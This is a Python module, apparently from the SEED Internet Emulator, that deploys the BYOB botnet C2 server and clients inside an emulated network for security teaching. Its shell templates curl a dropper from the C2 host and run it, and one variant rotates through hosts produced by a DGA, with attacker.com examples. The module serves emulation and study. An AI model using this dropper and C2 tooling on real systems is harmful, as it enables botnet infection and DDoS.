#!/usr/bin/env python3
# encoding: utf-8
# __author__ = 'Demon'
from __future__ import annotations
from seedemu.core import Node, NodeFile, NodeSoftware, Service, Server, Emulator
from typing import Dict

BYOB_VERSION='3924dd6aea6d0421397cdf35f692933b340bfccf'

BotnetServerFileTemplates: Dict[str, str] = {}

BotnetServerFileTemplates['byob_install'] = '''\
#!/bin/bash

git clone https://github.com/malwaredllc/byob.git /tmp/byob/
git -C /tmp/byob/ checkout {}
pip3 install -r /tmp/byob/byob/requirements.txt
'''.format(BYOB_VERSION)

BotnetServerFileTemplates['client_dropper_runner'] = '''\
#!/bin/bash
url="http://$1:$2/clients/droppers/client.py"
until curl -sHf "$url" -o client.py > /dev/null; do {
    echo "botnet-client: server $1:$2 not ready, waiting..."
    sleep 1
}; done
echo "botnet-client: server ready!"
python3 client.py &
'''

BotnetServerFileTemplates['client_dropper_runner_dga'] = '''\
#!/bin/bash
chmod +x /dga
while true; do {
    host="`/dga | shuf -n1`"
    echo "botnet-client: dga: trying $host..."
    url="http://$host/clients/droppers/client.py"
    curl -sHf "$url" -o client.py && {
        echo "botnet-client: dga: $host works!"
        python3 client.py
    }
    sleep 1
}; done
'''

BotnetServerFileTemplates['server_init_script'] = '''\
#!/bin/bash
cd /tmp/byob/byob
echo -e 'exit\\ny' | python3 server.py --port $2
python3 client.py --name 'client' $1 $2
'''

BotnetServerFileTemplates['start-byob-shell'] = '''\
#!/bin/bash
cd /tmp/byob/byob
python3 server.py --port {}
'''

BotnetServerFileTemplates['server_patch'] = '''\
diff --git a/byob/core/util.py b/byob/core/util.py
index eca72d4..96160c6 100644
--- a/byob/core/util.py
+++ b/byob/core/util.py
@@ -76,6 +76,7 @@ def public_ip():
     Return public IP address of host machine

     """
+    return local_ip()
     import sys
     if sys.version_info[0] > 2:
         from urllib.request import urlopen
@@ -143,6 +144,7 @@ def geolocation():
     """
     Return latitute/longitude of host machine (tuple)
     """
+    return ("0", "0")
     import sys
     import json
     if sys.version_info[0] > 2:
diff --git a/byob/modules/util.py b/byob/modules/util.py
index 5c5958a..ea1c9d4 100644
--- a/byob/modules/util.py
+++ b/byob/modules/util.py
@@ -76,6 +76,7 @@ def public_ip():
     Return public IP address of host machine

     """
+    return local_ip()
     import sys
     if sys.version_info[0] > 2:
         from urllib.request import urlopen
@@ -143,6 +144,7 @@ def geolocation():
     """
     Return latitute/longitude of host machine (tuple)
     """
+    return ("0", "0")
     import sys
     import json
     if sys.version_info[0] > 2:
'''

BOTNET_DEFAULT_SOFTWARE = [
    NodeSoftware('git'),
    NodeSoftware('cmake'),
    NodeSoftware('python3-dev'),
    NodeSoftware('gcc'),
    NodeSoftware('g++'),
    NodeSoftware('make'),
    NodeSoftware('python3-pip'),
    NodeSoftware('byob', NodeFile('/byob_install.sh', BotnetServerFileTemplates['byob_install'], isExecutable=True))
]

class BotnetServer(Server):
    """!
    @brief The BotnetServer class.
    """

    __port: int
    __files: Dict[str, str]

    def __init__(self):
        """!
        @brief BotnetServer constructor.
        """
        super().__init__()
        self.__port = 445
        self.__files = {}

    def setPort(self, port: int) -> BotnetServer:
        """!
        @brief Set BYOB port. Default to 445.

        Beside the given port, the follow ports will also be opened:
        port + 1: HTTP server hosting BYOB modules (for client to import)
        port + 2: HTTP server host Python packages (for client to import)
        port + 3: HTTP server for incoming uploads.

        @param port port.

        @returns self, for chaining API calls.
        """
        self.__port = port
        return self

    def addFile(self, content: str, path: str):
        """!
        @deprecated to be removed in future version. use
        emulator.getVirtualNode(nodename).setFile instead.

        @brief Add a file to the C2 server. You can use this API to add files
        onto the physical node of the C2 server. This can be useful for
        preparing attack scripts for uploading to the client.

        @param content file content.
        @param path full file path. (ex: /tmp/ddos.py)

        @returns self, for chaining API calls.
        """
        
        self.__files[path] = content

        return self

    def install(self, node: Node):
        """!
        @brief Install the Botnet C2 server.
        """
        address = str(node.getInterfaces()[0].getAddress())

        # add user files
        for (path, body) in self.__files.items():
            node.setFile(path, body)

        # get byob & its dependencies
        for soft in BOTNET_DEFAULT_SOFTWARE:
            node.addSoftware(soft)

        # patch byob - removes external request for getting IP location, which won't work if "real" internet is not connected.
        node.setFile('/tmp/byob.patch', BotnetServerFileTemplates['server_patch'])
        node.appendStartCommand('git -C /tmp/byob/ apply /tmp/byob.patch')

        # add the init script to server
        node.setFile('/tmp/byob_server_init_script', BotnetServerFileTemplates['server_init_script'], isExecutable=True)

        # start the server & make dropper/stager/payload
        node.appendStartCommand('/tmp/byob_server_init_script "{}" "{}"'.format(address, self.__port))

        # script to start byob shell on correct port
        node.setFile('/bin/start-byob-shell', BotnetServerFileTemplates['start-byob-shell'].format(self.__port), isExecutable=True)

        # set attributes for client to find us
        node.setAttribute('botnet_addr', address)
        node.setAttribute('botnet_port', self.__port + 1)

    @classmethod
    def softwareDeps(cls) -> List[NodeSoftware]:
        """!
        @brief get the set of ALL software this component is dependent on (i.e., may install on a node.)

        @returns set of software this component may install on a node.
        """
        return BOTNET_DEFAULT_SOFTWARE

class BotnetClientServer(Server):
    """!
    @brief The BotnetClientServer class.
    """

    __server: str
    __dga: str
    __emulator: Emulator

    def __init__(self):
        """!
        @brief BotnetClient constructor.
        """
        super().__init__()
        self.__server = None
        self.__port = 446
        self.__dga = None

    def useBindingFrom(self, emulator: Emulator):
        """!
        @brief set the emulator for the client to look for server from.

        note: to be called by the render procress. 

        @param emulator emulator.
        """
        self.__emulator = emulator

    def setServer(self, server: str) -> BotnetClientServer:
        """!
        @brief BotnetClient constructor.

        @param server name of the BYOB server virtual node.

        @returns self, for chaining API calls.
        """
        self.__server = server

        return self

    def setDga(self, dgaScript: str) -> BotnetClientServer:
        """!
        @brief set script for generating domain names. 

        The script will be executed to get a "server:port" list, one server each
        line. The script can be anything - bash, python, perl (may need
        addSoftware(NodeSoftware('perl')), self), etc. The script should have the correct shebang
        interpreter directive at the beginning.

        Example output:

        abcd.attacker.com:446
        1234.attacker.com:446
        zzzz.attacker.com:446

        If DGA is used, server configured in setServer will be ignored. To
        disable DGA, do setDga(None).

        @param dgaScript content of DGA script, or None to disable DGA.

        @returns self, for chaining API calls.
        """
        self.__dga = dgaScript

        return self

    def install(self, node: Node):
        assert self.__server != None or self.__dga != None, 'botnet-client on as{}/{} has no server configured!'.format(node.getAsn(), node.getName())


        # get byob dependencies.
        for package in BOTNET_DEFAULT_SOFTWARE:
            node.addSoftware(package)

        fork = False

        # script to get dropper from server.
        if self.__dga == None:
            node.setFile('/tmp/byob_client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner'], isExecutable=True)
        else:
            fork = True
            node.setFile('/dga', self.__dga)
            node.setFile('/tmp/byob_client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner_dga'], isExecutable=True)

        server: Node = self.__emulator.getBindingFor(self.__server)

        addr = server.getAttribute('botnet_addr', None)
        port = server.getAttribute('botnet_port', None)

        assert addr != None and port != None, 'cannot find server details from botnet controller the node on {} (as{}/{}). is botnet controller installed on it?'.format(self.__server, server.getAsn(), server.getName())

        # get and run dropper from server.
        node.appendStartCommand('/tmp/byob_client_dropper_runner "{}" "{}"'.format(addr, port), fork)

    @classmethod
    def softwareDeps(cls) -> List[NodeSoftware]:
        """!
        @brief get the set of ALL software this component is dependent on (i.e., may install on a node.)

        @returns set of software this component may install on a node.
        """
        return BOTNET_DEFAULT_SOFTWARE

class BotnetService(Service):
    """!
    @brief Botnet C2 server service.
    """

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _createServer(self) -> Server:
        return BotnetServer()

    @classmethod
    def softwareDeps(cls) -> List[NodeSoftware]:
        """!
        @brief get the set of ALL software this component is dependent on (i.e., may install on a node.)

        @returns set of software this component may install on a node.
        """
        return BotnetServer.softwareDeps()

class BotnetClientService(Service):
    """!
    @brief Botnet client service.
    """

    __emulator: Emulator

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _doConfigure(self, node: Node, server: Server):
        server.useBindingFrom(self.__emulator)

    def configure(self, emulator: Emulator):
        self.__emulator = emulator
        return super().configure(emulator)

    def _createServer(self) -> Server:
        return BotnetClientServer()

    @classmethod
    def softwareDeps(cls) -> List[NodeSoftware]:
        """!
        @brief get the set of ALL software this component is dependent on (i.e., may install on a node.)

        @returns set of software this component may install on a node.
        """
        return BotnetClientServer.softwareDeps()
